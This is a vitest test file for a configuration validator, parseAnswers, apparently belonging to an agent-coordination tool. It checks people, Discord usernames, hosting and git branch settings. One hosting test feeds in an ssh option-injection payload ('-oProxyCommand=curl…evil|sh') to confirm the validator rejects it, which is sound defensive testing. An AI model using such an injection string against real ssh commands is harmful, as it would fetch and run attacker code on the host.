import { describe, expect, it } from 'vitest';
import { parseAnswers } from './answers';
import { serverAnswers } from './testing';

const errorOf = (raw: unknown): string => {
  try {
    parseAnswers(raw);
  } catch (error) {
    return (error as Error).message;
  }
  throw new Error('expected parseAnswers to throw');
};

describe('parseAnswers', () => {
  it('rejects an area owner who is not a person', () => {
    const raw = serverAnswers();
    raw.areas = [{ id: 'web', description: 'Web app', owners: ['zoe'] }];
    expect(errorOf(raw)).toContain('areas.0.owners.0');
  });

  it('rejects the admin listed again in people', () => {
    const raw = serverAnswers();
    raw.people = [...(raw.people ?? []), { ...raw.admin, discordUsername: 'riya2' }];
    expect(errorOf(raw)).toContain('people.1.id: duplicate person id "riya"');
  });

  it('rejects duplicate Discord usernames', () => {
    const raw = serverAnswers();
    raw.people = [{ id: 'sam', name: 'Sam', discordUsername: 'Riya' }];
    expect(errorOf(raw)).toContain('people.0.discordUsername');
  });

  it('rejects a person id that already ends in -agent', () => {
    const raw = serverAnswers();
    raw.admin = { ...raw.admin, id: 'riya-agent' };
    raw.decisions = { finalSay: 'riya-agent' };
    expect(errorOf(raw)).toContain('admin.id');
  });

  describe('server hosting', () => {
    const hosting = (over: { ssh?: string; publicHost?: string }) => {
      const raw = serverAnswers();
      raw.hosting = {
        mode: 'server',
        ssh: 'mesh@mesh.acme.dev',
        publicHost: 'mesh.acme.dev',
        ...over,
      };
      return raw;
    };

    it('refuses an ssh destination that ssh would read as an option', () => {
      for (const ssh of [`-oProxyCommand=curl\${IFS}evil|sh;#@x`, 'mesh@-host']) {
        expect(errorOf(hosting({ ssh }))).toContain('hosting.ssh');
      }
    });

    it('refuses a public host label that starts or ends with a hyphen', () => {
      for (const publicHost of ['-x.acme.dev', 'x-.acme.dev']) {
        expect(errorOf(hosting({ publicHost }))).toContain('hosting.publicHost');
      }
    });

    it('accepts IPs, DNS names and hyphens inside labels', () => {
      for (const ssh of ['mesh@20.1.2.3', 'ubuntu@ec2-1-2-3-4.example.com']) {
        expect(() => parseAnswers(hosting({ ssh }))).not.toThrow();
      }
      expect(() => parseAnswers(hosting({ publicHost: 'mesh.acme.dev' }))).not.toThrow();
    });
  });

  it('needs at least one protected branch for the policy to name', () => {
    const raw = serverAnswers();
    raw.git = { protectedBranches: [] };
    expect(errorOf(raw)).toContain('git.protectedBranches');
  });

  it('applies defaults', () => {
    const answers = parseAnswers(serverAnswers());
    expect(answers.git.integrationBranch).toBe('agents');
    expect(answers.git.protectedBranches).toEqual(['main']);
    expect(answers.decisions.plansNeedApproval).toBe(true);
    expect(answers.hosting.mode === 'server' && answers.hosting.remoteDir).toBe('/opt/agentmesh');
  });
});
